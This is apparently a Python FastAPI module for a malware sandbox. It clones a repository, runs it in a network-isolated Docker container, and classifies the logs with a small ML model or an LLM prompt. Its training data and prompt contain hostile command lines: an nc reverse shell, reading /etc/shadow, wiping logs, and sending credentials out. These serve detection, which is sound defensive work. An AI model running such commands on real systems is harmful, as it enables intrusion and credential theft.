import os
import shutil
import tempfile
import asyncio
import zipfile
import subprocess
from pathlib import Path
from fastapi import APIRouter, WebSocket, WebSocketDisconnect, UploadFile, File, Form, HTTPException
from pydantic import BaseModel
import docker
import requests
import json
import os
from groq import Groq

router = APIRouter()

# Initialize Groq client
try:
    groq_client = Groq(api_key=os.environ.get("GROQ_API_KEY"))
except Exception as e:
    print(f"[!] Groq initialization failed: {e}")
    groq_client = None

# Removed top-level docker_client to instantiate per-request

def get_docker_client():
    """Try to connect to Docker with Windows-specific fallbacks."""
    try:
        # Standard env-based connection (works for Docker Desktop)
        return docker.from_env()
    except Exception:
        try:
            # Explicit Windows Named Pipe connection
            return docker.DockerClient(base_url='npipe:////./pipe/docker_engine')
        except Exception as e:
            raise Exception("Docker Desktop is not running. Please start Docker Desktop and try again.")

# 1. Models
class RepoURLRequest(BaseModel):
    url: str

class ReportModel(BaseModel):
    status: str
    risk_score: int
    findings: list[str]

# 2. Setup Temporary Environment
def prepare_environment(source_type: str, source_data: any) -> str:
    # Use the system's default temporary directory instead of a local 'sandboxes' folder.
    # This prevents Uvicorn's '--reload' watcher from detecting file changes 
    # during sandbox creation and accidentally restarting the server.
    temp_dir = tempfile.mkdtemp(prefix="sentinel_")
    print(f"[*] Created temp dir: {temp_dir}")
    
    if source_type == "url":
        # Clone repo
        subprocess.run(["git", "clone", "--depth", "1", source_data, "repo"], cwd=temp_dir, check=True)
        repo_dir = os.path.join(temp_dir, "repo")
        
        # Give Windows Defender 2 seconds to finish its scan and release the file lock
        import time
        time.sleep(2)
        
        # Prevent Docker from trying to read the .git folder which can also cause context errors
        with open(os.path.join(repo_dir, ".dockerignore"), "w") as f:
            f.write(".git\n")
            
        return repo_dir
    elif source_type == "zip":
        # Extract zip
        # Assuming source_data is a file path to the saved zip
        with zipfile.ZipFile(source_data, 'r') as zip_ref:
            zip_ref.extractall(os.path.join(temp_dir, "repo"))
        return os.path.join(temp_dir, "repo")
    
    return temp_dir

# 3. Detect Language and Entrypoint
def analyze_environment(repo_dir: str) -> dict:
    # A simple detection logic
    # Real implementation should be more robust
    
    files = []
    for root, _, filenames in os.walk(repo_dir):
        for f in filenames:
            files.append(os.path.relpath(os.path.join(root, f), repo_dir))
            
    # Python Detection
    if "requirements.txt" in files or any(f.endswith(".py") for f in files):
        entrypoint = "main.py" if "main.py" in files else "app.py" if "app.py" in files else next((f for f in files if f.endswith(".py")), "")
        entrypoint = entrypoint.replace("\\", "/") # Normalize path for Linux container
        
        # Guarantee 'cryptography' is installed so the ransomware payload doesn't crash silently
        install_cmd = "pip install -r requirements.txt && pip install cryptography" if "requirements.txt" in files else "pip install cryptography"
        
        return {
            "language": "python",
            "image": "python:3.10-slim",
            "install_cmd": install_cmd,
            "run_cmd": f"python {entrypoint}" if entrypoint else "echo 'No entrypoint found'"
        }
        
    # Node.js Detection
    if "package.json" in files or any(f.endswith(".js") for f in files):
        return {
            "language": "node",
            "image": "node:18-alpine",
            "install_cmd": "npm install" if "package.json" in files else "echo 'No package.json'",
            "run_cmd": "npm start" if "package.json" in files else "node index.js" # Simplified
        }
        
    return {"language": "unknown", "image": "alpine", "install_cmd": "", "run_cmd": "echo 'Unsupported language'"}

# 4. Generate Dockerfile
def generate_dockerfile(repo_dir: str, analysis: dict):
    dockerfile_content = f"""
    FROM {analysis['image']}
    WORKDIR /app
    COPY . /app
    RUN {analysis['install_cmd']}
    CMD {analysis['run_cmd']}
    """
    with open(os.path.join(repo_dir, "Dockerfile"), "w") as f:
        f.write(dockerfile_content.strip())
        
# 5. ML Analysis (using Groq)
local_ml_available = False
local_log_classifier = None
local_log_vectorizer = None

try:
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.ensemble import RandomForestClassifier
    import numpy as np
    
    # Train a simple local model for log behavioral analysis
    training_logs = [
        ("Starting web server on port 8080... OK\nAccepting connections...", "CLEAN"),
        ("Loading configuration from config.yaml\nInitializing database...", "CLEAN"),
        ("Connecting to malicious IP 192.168.1.100...\nDownloading payload.sh\nExecuting payload.sh", "MALICIOUS"),
        ("nc -e /bin/bash 10.0.0.5 4444\nConnection established.", "MALICIOUS"),
        ("cat /etc/shadow\nroot:$6$xyz...", "MALICIOUS"),
        ("rm -rf /var/log/*\nLogs cleared.", "SUSPICIOUS"),
        ("Found AWS credentials in ~/.aws/credentials\nSending to remote server...", "MALICIOUS"),
        ("Importing requests module\nFetching data from API...", "CLEAN")
    ]
    
    local_log_vectorizer = TfidfVectorizer()
    X_train = local_log_vectorizer.fit_transform([text for text, label in training_logs])
    y_train = [label for text, label in training_logs]
    
    local_log_classifier = RandomForestClassifier(n_estimators=10, random_state=42)
    local_log_classifier.fit(X_train, y_train)
    local_ml_available = True
    print("[*] Local ML Model (sklearn) initialized successfully for Log Analysis.")
except ImportError:
    print("[!] scikit-learn not found. Local ML model disabled. Falling back to Groq AI.")

def analyze_logs_with_local_ml(logs: str) -> ReportModel:
    if not local_ml_available:
        return None
    try:
        X_test = local_log_vectorizer.transform([logs])
        proba = np.max(local_log_classifier.predict_proba(X_test))
        pred = local_log_classifier.predict(X_test)[0]
        
        # Require reasonable confidence to override Groq fallback
        if proba > 0.6:
            risk_score = 0
            findings = []
            if pred == "MALICIOUS":
                risk_score = 90
                findings = ["Local ML detected highly malicious patterns in the logs (e.g., potential reverse shells, unauthorized access to shadow files, or data exfiltration attempts)."]
            elif pred == "SUSPICIOUS":
                risk_score = 50
                findings = ["Local ML detected suspicious behavior in the execution logs."]
            elif pred == "CLEAN":
                risk_score = 0
                findings = ["Execution logs appear clean based on Local ML analysis."]
                
            return ReportModel(status=pred, risk_score=risk_score, findings=findings)
    except Exception as e:
        print(f"[!] Local ML Log Analysis Error: {e}")
    return None

async def analyze_logs_with_ml(logs: str) -> ReportModel:
    # 1. First Step: Try Local ML Model
    if local_ml_available:
        print("[*] Attempting to analyze logs with Local ML Model...")
        ml_result = analyze_logs_with_local_ml(logs)
        if ml_result:
             print("[*] Local ML Model successfully provided an output.")
             return ml_result
        else:
             print("[*] Local ML Model could not provide confident output. Falling back to Groq AI...")
             
    # 2. Second Step: Fallback to Groq
    if not groq_client:
        return ReportModel(status="ERROR", risk_score=0, findings=["Groq AI not configured."])
        
    try:
        # Truncate logs if they are too long for context
        max_log_len = 10000 
        truncated_logs = logs[-max_log_len:] if len(logs) > max_log_len else logs
        
        prompt = f"""
        You are a highly advanced cybersecurity behavioral analysis engine.
        Review the following execution logs from a sandboxed container to determine if the code exhibits malicious or highly suspicious behavior.

        Focus on:
        1. Reconnaissance (e.g., scanning environment variables, looking for keys)
        2. Command & Control (e.g., opening raw sockets, connecting to non-standard IP/Ports, reverse shells like nc -e, bash -i)
        3. Persistence (e.g., writing hidden files starting with '.', modifying startup scripts)
        4. Evasion or destructive behavior (e.g., file encryption, accessing /etc/shadow)

        Logs:
        ```
        {truncated_logs}
        ```

        Respond ONLY with a valid JSON object in the exact following format. No markdown tags outside the JSON, no extra text.
        {{
            "status": "CLEAN" | "SUSPICIOUS" | "MALICIOUS",
            "risk_score": <integer from 0 to 100>,
            "findings": [
                "<Detailed explanation of suspicious finding 1>",
                "<Detailed explanation of suspicious finding 2>"
            ]
        }}
        """
        
        response = groq_client.chat.completions.create(
            messages=[{"role": "user", "content": prompt}],
            model="llama-3.3-70b-versatile",
            temperature=0.1,
            response_format={"type": "json_object"}
        )
        
        result_json = response.choices[0].message.content
        result_dict = json.loads(result_json)
        
        return ReportModel(
            status=result_dict.get("status", "UNKNOWN"),
            risk_score=result_dict.get("risk_score", 0),
            findings=result_dict.get("findings", [])
        )
        
    except Exception as e:
        print(f"[!] Groq Analysis Error: {e}")
        return ReportModel(
            status="ERROR", 
            risk_score=0, 
            findings=[f"AI Analysis Failed: {str(e)}"]
        )


@router.websocket("/ws/sentinel")
async def sentinel_sandbox(websocket: WebSocket):
    await websocket.accept()
    print("[*] Sentinel Sandbox WS connected.")
    
    temp_dir = None
    container = None
    image_id = None
    
    try:
        data = await websocket.receive_text()
        request_data = json.loads(data)
        
        await websocket.send_json({"type": "status", "message": "Initializing Sandbox..."})
        
        source_type = request_data.get("type")
        source_data = request_data.get("data")
        
        if source_type == "url":
            await websocket.send_json({"type": "status", "message": f"Cloning repository from {source_data}..."})
            repo_dir = prepare_environment("url", source_data)
            temp_dir = os.path.dirname(repo_dir) # The parent dir containing 'repo'
        else:
             await websocket.send_json({"type": "error", "message": "Only URL is supported in this demo for now."})
             return
             
        await websocket.send_json({"type": "status", "message": "Analyzing environment..."})
        analysis = analyze_environment(repo_dir)
        
        await websocket.send_json({"type": "status", "message": f"Detected: {analysis['language']}. Generating Ephemeral Container..."})
        generate_dockerfile(repo_dir, analysis)
        
        try:
            docker_client = get_docker_client()
        except Exception as e:
            await websocket.send_json({"type": "error", "message": str(e)})
            return
             
        await websocket.send_json({"type": "status", "message": "Building image... This might take a moment."})
        
        # Build Image
        image, build_logs = docker_client.images.build(path=repo_dir, tag=f"sentinel_{os.path.basename(temp_dir)}")
        image_id = image.id
        
        for log_line in build_logs:
            if 'stream' in log_line:
                await websocket.send_json({"type": "log", "stream": "stdout", "data": log_line['stream']})

        await websocket.send_json({"type": "status", "message": "Detonating container (30s timeout)..."})
        
        # Run Container
        container = docker_client.containers.run(
            image.id,
            detach=True,
            network_mode="none", # Hardened: no network access
            mem_limit="128m",
            cpu_quota=50000,
        )
        
        # Stream logs real-time
        all_logs = ""
        log_stream = container.logs(stream=True, follow=True)
        
        start_time = asyncio.get_event_loop().time()
        
        for log_chunk in log_stream:
            decoded_chunk = log_chunk.decode('utf-8', errors='replace')
            all_logs += decoded_chunk
            await websocket.send_json({"type": "log", "stream": "stdout", "data": decoded_chunk})
            
            # Enforce 30s timeout manually in loop (better approach would use threads/asyncio properly)
            if asyncio.get_event_loop().time() - start_time > 30:
                await websocket.send_json({"type": "status", "message": "Execution timeout reached (30s). Killing container."})
                break

        container.stop(timeout=1)
        
        await websocket.send_json({"type": "status", "message": "Execution complete. Running Behavioral Analysis ..."})
        
        report = await analyze_logs_with_ml(all_logs)
        
        await websocket.send_json({
            "type": "report", 
            "status": report.status,
            "risk_score": report.risk_score,
            "findings": report.findings
        })
        
    except WebSocketDisconnect:
        print("[*] Sentinel WS Disconnected.")
    except Exception as e:
        print(f"[!] Sentinel Error: {e}")
        try:
             await websocket.send_json({"type": "error", "message": str(e)})
        except:
             pass
    finally:
        # Cleanup
        print("[*] Performing Sentinel Cleanup...")
        if container:
            try:
                container.remove(force=True)
                print(f"Removed container {container.id}")
            except:
                pass
        if image_id:
            try:
                docker_client.images.remove(image=image_id, force=True)
                print(f"Removed image {image_id}")
            except:
                pass
        if temp_dir and os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
            print(f"Removed temp dir {temp_dir}")
            
